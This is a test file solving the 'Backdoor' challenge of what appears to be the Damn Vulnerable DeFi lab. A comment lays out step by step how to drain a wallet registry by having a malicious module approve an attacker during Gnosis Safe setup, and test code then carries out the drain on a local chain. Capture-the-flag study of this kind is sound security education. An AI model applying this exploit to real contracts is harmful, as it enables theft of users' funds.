const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This challenge introduces the idea of proxy contracts and singleton 
     * contracts.
     * 
     * The way this works is that you can have a factory contract which deploys 
     * proxies to the Gnosis Safe singleton contract. This essentially means
     * that the proxy offloads all logic to the singleton contract with the
     * context of the proxy state. It does this through delegate calls.
     * 
     * Factory CALLS -> Proxy DELEGATECALLS -> Singleton Gnosis Safe
     * 
     * Now we can create new Gnosis safes with anyone as the owner which means
     * we can create a safe on the behalf of the beneficiraies and then 
     * ensure the factory calls back to the WalletRegistry contract. During
     * this callback the contract will transfer 10 DVT to the newly created
     * Gnosis safe. However we are unable to access it since it is solely owned
     * by one of the beneficiaries. 
     * 
     * To get around this we can install a backdoor module into the Gnosis safe
     * on initialization which DOES NOT require the signatures of the owners on
     * deployment only (if you try to add a module after deployment it does
     * require signatures).
     * 
     * You can exploit this via execTransactionFromModule() or even more simply,
     * you can run the exploit on the initialisation code of your module. Within 
     * this code you can approve the attacker/smart contract to spend the funds
     * of the Gnosis wallet.
     * 
     * Most of the logic is placed in the Smart Contract to allow this to happen
     * in one transaction. But essentially it goes:
     * 
     * 1. Deploy malicious contract
     * 2. Generate the ABI to call the setupToken() function in the malicious contract
     * 3. exploit(): Call exploit with the above ABI and the list of users
     * 4. exploit(): Generate the ABI to setup the new Gnosis wallet with the ABI from step 2
     *                  such that the callback address and function is the wallet registry
     * 5. exploit(): Call the ProxyFactory contract with the ABI from step 4 and a few other bobs
     *              with a callback to the WalletRegistry proxyCreated() function.
     * 6. createProxyWithCallback(): Deploys the new Proxy and calls setup() on the proxy
     * 7. setup(): New proxy is setup and sets up the module calling back to the malicous contract
     *              however this time is a delegate call meaning it is executed in the context
     *              of the newly create proxy contract.
     * 8. setupToken(): [proxy context] Approve 10 ether to be spent by the malicious contract
     *                  of the proxies token funds
     * 9. proxyCreated(): Callback executed on the wallet registry and passes checks and transfers
     *                      10 ether to the newly created wallet
     * 10. exploit(): Transfer the 10 ether from the Gnosis wallet to the attacker address
     * 11. Repeat for each beneficiary from within the contract and hence 1 transaction.
     * 
     * Attack contract is available at:
     * "contracts/attacker-contracts/AttackBackdoor.sol"
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attackerToken = this.token.connect(attacker);
        const attackerFactory = this.walletFactory.connect(attacker);
        const attackerMasterCopy = this.masterCopy.connect(attacker);
        const attackerWalletRegistry = this.walletRegistry.connect(attacker);

        // Helper Function
        const checkTokenBalance = async (address, name) => {
            const tokenBal = await attackerToken.balanceOf(address);
            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
        }

        await checkTokenBalance(attacker.address, "Attacker");

        // Deploy attacking contract
        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
        const attackModule = await AttackModuleFactory.deploy(
            attacker.address,
            attackerFactory.address,
            attackerMasterCopy.address,
            attackerWalletRegistry.address,
            attackerToken.address
        );
        console.log("Deployed attacking module at", attackModule.address);

        // ABI call to setupToken() which is malicious
        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
        const moduleIFace = new ethers.utils.Interface(moduleABI);
        const setupData = moduleIFace.encodeFunctionData("setupToken", [
            attackerToken.address, 
            attackModule.address
        ])

        // Do exploit in one transaction (after contract deployment)
        await attackModule.exploit(users, setupData);
          
        await checkTokenBalance(attacker.address, "Attacker");

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
